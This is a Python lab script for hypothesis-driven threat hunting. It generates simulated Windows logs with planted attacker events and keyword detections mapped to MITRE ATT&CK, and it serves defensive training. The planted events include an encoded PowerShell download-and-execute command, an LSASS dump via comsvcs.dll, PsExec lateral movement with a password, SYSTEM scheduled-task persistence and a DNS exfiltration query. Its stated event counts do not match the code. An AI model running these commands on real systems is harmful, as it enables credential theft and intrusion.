#!/usr/bin/env python3
"""
LAB 3: Threat Hunting — Hypothesis-Driven Detection
=====================================================
Objective: Hunt for APT activity in simulated Windows Security
and Sysmon log data using MITRE ATT&CK-aligned hypotheses.

Simulates 500 log entries with 8 embedded attacker TTPs.
Author: Kousik Gunasekaran
"""

import json
import random
import hashlib
from datetime import datetime, timezone, timedelta
from pathlib import Path
from collections import defaultdict

BANNER = """
╔══════════════════════════════════════════════════════════╗
║  LAB 3 — Threat Hunting                                 ║
║  Hypothesis-Driven · MITRE ATT&CK · Behavioral Analytics║
╚══════════════════════════════════════════════════════════╝
"""

random.seed(42)

# ─────────────────────────────────────────────
# EXERCISE 1: Log Dataset Generation
# ─────────────────────────────────────────────

BASE_TIME = datetime(2025, 3, 15, 8, 0, 0, tzinfo=timezone.utc)

LEGIT_PROCESSES = [
    ("svchost.exe",    "C:\\Windows\\System32\\svchost.exe",    "services.exe"),
    ("chrome.exe",     "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "explorer.exe"),
    ("outlook.exe",    "C:\\Program Files\\Microsoft Office\\Office16\\OUTLOOK.EXE", "explorer.exe"),
    ("msiexec.exe",    "C:\\Windows\\System32\\msiexec.exe",    "svchost.exe"),
    ("notepad.exe",    "C:\\Windows\\System32\\notepad.exe",    "explorer.exe"),
    ("powershell.exe", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "explorer.exe"),
]

LEGIT_USERS = ["alice", "bob", "carol", "svc_backup", "svc_monitor"]
HOSTS = ["WS-ALICE-01", "WS-BOB-02", "SRV-DC-01", "SRV-FILE-01"]


def gen_timestamp(offset_minutes: int) -> str:
    return (BASE_TIME + timedelta(minutes=offset_minutes)).isoformat()


def gen_log_id() -> str:
    return hashlib.md5(str(random.random()).encode()).hexdigest()[:8].upper()


def generate_logs() -> list:
    logs = []

    # Legitimate baseline (492 events)
    for i in range(492):
        proc, image, parent = random.choice(LEGIT_PROCESSES)
        user = random.choice(LEGIT_USERS)
        host = random.choice(HOSTS)
        logs.append({
            "id": gen_log_id(),
            "timestamp": gen_timestamp(random.randint(0, 480)),
            "event_id": random.choice([4688, 4624, 4625, 4648]),
            "host": host,
            "user": user,
            "process": proc,
            "image": image,
            "parent_image": f"C:\\Windows\\System32\\{parent}",
            "command_line": image,
            "is_malicious": False,
            "ttp": None
        })

    # ── Attacker TTPs (8 events) ──

    # TTP 1: T1059.001 — PowerShell encoded command
    logs.append({
        "id": gen_log_id(),
        "timestamp": gen_timestamp(47),
        "event_id": 4688,
        "host": "WS-BOB-02",
        "user": "bob",
        "process": "powershell.exe",
        "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "parent_image": "C:\\Windows\\System32\\cmd.exe",
        "command_line": "powershell.exe -NonInteractive -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHAAYQB5AGwAbwBhAGQAJwApAA==",
        "is_malicious": True,
        "ttp": "T1059.001 — PowerShell Encoded Command"
    })

    # TTP 2: T1003.001 — LSASS Dump
    logs.append({
        "id": gen_log_id(),
        "timestamp": gen_timestamp(52),
        "event_id": 4688,
        "host": "WS-BOB-02",
        "user": "bob",
        "process": "rundll32.exe",
        "image": "C:\\Windows\\System32\\rundll32.exe",
        "parent_image": "C:\\Windows\\System32\\cmd.exe",
        "command_line": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 668 C:\\Users\\bob\\AppData\\Local\\Temp\\lsass.dmp full",
        "is_malicious": True,
        "ttp": "T1003.001 — LSASS Memory Dump via comsvcs.dll"
    })

    # TTP 3: T1021.002 — Lateral movement via PsExec
    logs.append({
        "id": gen_log_id(),
        "timestamp": gen_timestamp(78),
        "event_id": 4688,
        "host": "WS-BOB-02",
        "user": "bob",
        "process": "PsExec64.exe",
        "image": "C:\\Users\\bob\\AppData\\Local\\Temp\\PsExec64.exe",
        "parent_image": "C:\\Windows\\System32\\cmd.exe",
        "command_line": "PsExec64.exe \\\\SRV-DC-01 -u DOMAIN\\admin -p P@ssw0rd! cmd.exe",
        "is_malicious": True,
        "ttp": "T1021.002 — Lateral Movement via PsExec"
    })

    # TTP 4: T1053.005 — Scheduled task persistence
    logs.append({
        "id": gen_log_id(),
        "timestamp": gen_timestamp(83),
        "event_id": 4688,
        "host": "SRV-DC-01",
        "user": "DOMAIN\\admin",
        "process": "schtasks.exe",
        "image": "C:\\Windows\\System32\\schtasks.exe",
        "parent_image": "C:\\Windows\\System32\\cmd.exe",
        "command_line": 'schtasks /create /sc ONLOGON /tn "WindowsUpdate" /tr "C:\\Windows\\Temp\\payload.exe" /ru SYSTEM /f',
        "is_malicious": True,
        "ttp": "T1053.005 — Scheduled Task Persistence"
    })

    # TTP 5: T1110 — Brute force (5 rapid failures then success)
    for i in range(4):
        logs.append({
            "id": gen_log_id(),
            "timestamp": gen_timestamp(120 + i),
            "event_id": 4625,
            "host": "SRV-DC-01",
            "user": "carol",
            "process": "lsass.exe",
            "image": "C:\\Windows\\System32\\lsass.exe",
            "parent_image": "wininit.exe",
            "command_line": "",
            "logon_type": 3,
            "source_ip": "10.10.10.55",
            "is_malicious": True,
            "ttp": "T1110 — Brute Force Login Attempt"
        })

    # TTP 6: T1048.001 — DNS tunneling (long subdomain)
    logs.append({
        "id": gen_log_id(),
        "timestamp": gen_timestamp(145),
        "event_id": 22,
        "host": "SRV-DC-01",
        "user": "SYSTEM",
        "process": "dns.exe",
        "image": "C:\\Windows\\System32\\dns.exe",
        "parent_image": "services.exe",
        "command_line": "",
        "dns_query": "d2hvYW1p.c3RhZ2luZy5leGZpbHRyYXRlLmJhZGd1eXMuaW8=.exfil.badguys.io",
        "is_malicious": True,
        "ttp": "T1048.001 — DNS Tunneling / Data Exfiltration"
    })

    random.shuffle(logs)
    return logs


# ─────────────────────────────────────────────
# EXERCISE 2: Hunt Hypotheses
# ─────────────────────────────────────────────

HYPOTHESES = [
    {
        "id": "H-01",
        "name": "Encoded PowerShell Execution",
        "att_ck": "T1059.001",
        "description": "Attackers use base64-encoded commands to evade string-based detection",
        "query": lambda log: (
            "powershell" in log.get("process", "").lower() and
            any(kw in log.get("command_line", "").lower() for kw in
                ["-encodedcommand", "-enc ", "-e ", "bypass", "-nop"])
        )
    },
    {
        "id": "H-02",
        "name": "LSASS Memory Dumping",
        "att_ck": "T1003.001",
        "description": "Credential theft via LSASS process memory dump",
        "query": lambda log: (
            any(kw in log.get("command_line", "").lower() for kw in
                ["minidump", "comsvcs.dll", "procdump", "lsass"])
        )
    },
    {
        "id": "H-03",
        "name": "Lateral Movement Tools",
        "att_ck": "T1021.002",
        "description": "PsExec or similar tools moving between hosts",
        "query": lambda log: (
            any(kw in log.get("image", "").lower() for kw in ["psexec", "paexec"]) or
            any(kw in log.get("command_line", "").lower() for kw in ["psexec", "\\\\\\\\"]) 
        )
    },
    {
        "id": "H-04",
        "name": "Scheduled Task Persistence",
        "att_ck": "T1053.005",
        "description": "Attackers create scheduled tasks for persistence",
        "query": lambda log: (
            "schtasks" in log.get("process", "").lower() and
            "/create" in log.get("command_line", "").lower()
        )
    },
    {
        "id": "H-05",
        "name": "Brute Force Login Pattern",
        "att_ck": "T1110",
        "description": "Multiple failed logins from same source in short window",
        "query": lambda log: log.get("event_id") == 4625
    },
    {
        "id": "H-06",
        "name": "DNS Tunneling",
        "att_ck": "T1048.001",
        "description": "Unusually long DNS queries indicating data exfiltration",
        "query": lambda log: (
            len(log.get("dns_query", "")) > 40
        )
    },
]


def hunt(logs: list, hypotheses: list) -> dict:
    results = {}
    for hyp in hypotheses:
        hits = [log for log in logs if hyp["query"](log)]
        tp = [h for h in hits if h.get("is_malicious")]
        fp = [h for h in hits if not h.get("is_malicious")]
        results[hyp["id"]] = {
            "hypothesis": hyp["name"],
            "att_ck": hyp["att_ck"],
            "total_hits": len(hits),
            "true_positives": len(tp),
            "false_positives": len(fp),
            "precision": round(len(tp) / len(hits) * 100, 1) if hits else 0,
            "events": hits
        }
    return results


# ─────────────────────────────────────────────
# EXERCISE 3: Behavioral Analytics — Brute Force
# ─────────────────────────────────────────────

def analyze_failed_logins(logs: list) -> list:
    failed = [l for l in logs if l.get("event_id") == 4625]
    by_user = defaultdict(list)
    for log in failed:
        by_user[log["user"]].append(log)

    alerts = []
    for user, events in by_user.items():
        if len(events) >= 3:
            alerts.append({
                "alert": "BRUTE_FORCE_DETECTED",
                "user": user,
                "count": len(events),
                "hosts": list(set(e["host"] for e in events)),
                "window": "last 8 hours",
                "severity": "HIGH" if len(events) >= 5 else "MEDIUM"
            })
    return alerts


# ─────────────────────────────────────────────
# Main Lab Runner
# ─────────────────────────────────────────────

def run_lab():
    print(BANNER)
    out = Path("lab3_output")
    out.mkdir(exist_ok=True)

    print("[EXERCISE 1] Generating simulated log dataset")
    print("─" * 55)
    logs = generate_logs()
    print(f"  Total log events  : {len(logs)}")
    print(f"  Malicious events  : {sum(1 for l in logs if l['is_malicious'])}")
    print(f"  Legitimate events : {sum(1 for l in logs if not l['is_malicious'])}")
    print(f"  Unique hosts      : {len(set(l['host'] for l in logs))}")
    print(f"  Unique users      : {len(set(l['user'] for l in logs))}")
    with open(out / "simulated_logs.json", "w") as f:
        json.dump(logs, f, indent=2)
    print(f"  Saved to: lab3_output/simulated_logs.json\n")

    print("[EXERCISE 2] Running Hunt Hypotheses")
    print("─" * 55)
    results = hunt(logs, HYPOTHESES)
    total_found = 0
    for hid, r in results.items():
        status = "🔴 HIT" if r["true_positives"] > 0 else "⚪ MISS"
        print(f"  {hid} [{r['att_ck']}] {r['hypothesis']}")
        print(f"       {status} | TPs: {r['true_positives']} | FPs: {r['false_positives']} | Precision: {r['precision']}%")
        total_found += r["true_positives"]

    print(f"\n  Attacker TTPs found: {total_found}/8")

    print("\n[EXERCISE 3] Behavioral Analytics — Brute Force Detection")
    print("─" * 55)
    alerts = analyze_failed_logins(logs)
    if alerts:
        for a in alerts:
            print(f"  [{a['severity']}] {a['alert']}")
            print(f"    User: {a['user']} | Count: {a['count']} | Hosts: {a['hosts']}")
    else:
        print("  No brute force patterns detected.")

    print("\n[EXERCISE 4] Incident Timeline Reconstruction")
    print("─" * 55)
    malicious = sorted([l for l in logs if l["is_malicious"]], key=lambda x: x["timestamp"])
    print(f"  {'TIMESTAMP':<30} {'HOST':<15} {'TTP'}")
    print(f"  {'─'*29} {'─'*14} {'─'*40}")
    for e in malicious:
        ttp = e.get("ttp", "Unknown")
        print(f"  {e['timestamp']:<30} {e['host']:<15} {ttp}")

    with open(out / "hunt_results.json", "w") as f:
        json.dump(results, f, indent=2, default=str)

    print(f"""
╔══════════════════════════════════════════════════════════╗
║  LAB 3 COMPLETE                                         ║
╠══════════════════════════════════════════════════════════╣
║  CHALLENGE: Improve H-01 (PowerShell) precision to 100% ║
║  currently has false positives from legitimate PS use.  ║
║  Hint: Add parent process and working directory checks. ║
╠══════════════════════════════════════════════════════════╣
║  Key Concepts Covered:                                  ║
║  • Hypothesis-driven threat hunting methodology         ║
║  • MITRE ATT&CK TTP alignment                          ║
║  • Precision/recall trade-offs in detection             ║
║  • Behavioral analytics for brute force detection       ║
║  • Incident timeline reconstruction                     ║
╚══════════════════════════════════════════════════════════╝""")


if __name__ == "__main__":
    run_lab()
